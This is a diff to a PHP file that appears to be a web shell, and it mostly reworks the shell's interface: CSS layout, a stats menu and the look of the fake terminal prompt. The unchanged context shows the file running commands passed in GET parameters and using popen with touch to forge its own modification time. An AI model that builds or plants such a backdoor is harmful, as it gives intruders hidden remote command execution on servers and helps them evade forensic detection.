@@ -34,12 +34,13 @@
 			$nothing = popen("touch " . __FILE__ . " -t {$stamp}",$this->mode);
 		}
 	}
- 
-	?>
+
+	$userInterface = new UserInterface();
+?>
+
 
 <?php if (isset($_GET['command']) || isset($_GET['shellCommand'])): ?>
 <?php
-	$userInterface = new UserInterface();
 	if(isset($_GET['command'])) {
 		$command = $_GET['command'];
 		switch($command) {
@@ -105,7 +106,18 @@
 	color: #fff;
 	border: 0px;
 }
+
+#XmenuStats ul li {
+	color: #cad0c4;
+	float: right;
+	padding: 12px 10px;
+	margin-right: 30px;
+	/* display: inline; */
+}
+
+/*
 #XsideBar {
+
 	float: right;
 	width: 12%;
 	height: 100%;
@@ -120,16 +132,17 @@
 #XsideBar ul li {
 	list-style-type: none;
 }
+*/
 
 #XmainShell {
-	float: left;
-	clear: left;
+	/*float: center;
+	 clear: left; */
 	height: 100%;
 	padding: 20px 0px;
 	margin: 0px;
 	background-color: #1f1f1f;
 	color: #fff;
-	width: 88%;
+	width: 100%;
 }
 
 #XoutputShell {
@@ -194,7 +207,7 @@
 	color: #cad0c4;
 }
 
-#XShellOutput p {
+#XShellOutput pre {
 	margin-top: 1px;
 	margin-bottom: 1px;
 }
@@ -210,17 +223,24 @@
 			<li><button id="XbuttonPerm" name="command" value="perm">Permissions</button></li>
 			<li><button id="XbuttonPs" name="command" value="ps">Processes</button></li>
 		</ul>
+		<div id="XmenuStats">
+			<ul>
+				<li id="XPHPversion"> PHP </li>
+			</ul>
+		</div>
 		</form>
 	<br>
 	</div>
 	<div id="XmainContainer">
-		<div id="XsideBar">
+<!--	
+	<div id="XsideBar">
 			<ul>
 				<li id="XPHPversion">Something here?</li>
 				<li>or here</li>
 				<li>or here</li>
 			</ul>
 		</div>
+!-->
 		<div id="XmainShell">
 			<div id="XShellContainer">
 				<div id="XShellOutput">
@@ -233,6 +253,7 @@
 		<script type="text/javascript">
 $(document).ready( function() {
 
+
 	function submit(command) {
 		$.ajax({
 		url: "<?php echo $connectstr; ?>",
@@ -244,13 +265,16 @@ $(document).ready( function() {
 		});
 	}
 
+
+	var user = "badass";
+	var hostname = "microserver";
+
 	function renderCmd(command, output) {
 		var time = new Date().toLocaleTimeString('en-GB', { hour: "numeric", minute: "numeric"});
-		$("#XShellOutput").append("<pre class='command'> " + time + " root@box $ " + command + "</pre>");
+		$("#XShellOutput").append("<pre class='command'>" + time + " "+ user + "@" + hostname + " $ " + command + "</pre>");
 		$("#XShellOutput").append("<pre class='output'>" + output + "</pre>");
 	}
 	
-
 	var request = "";
 
 	
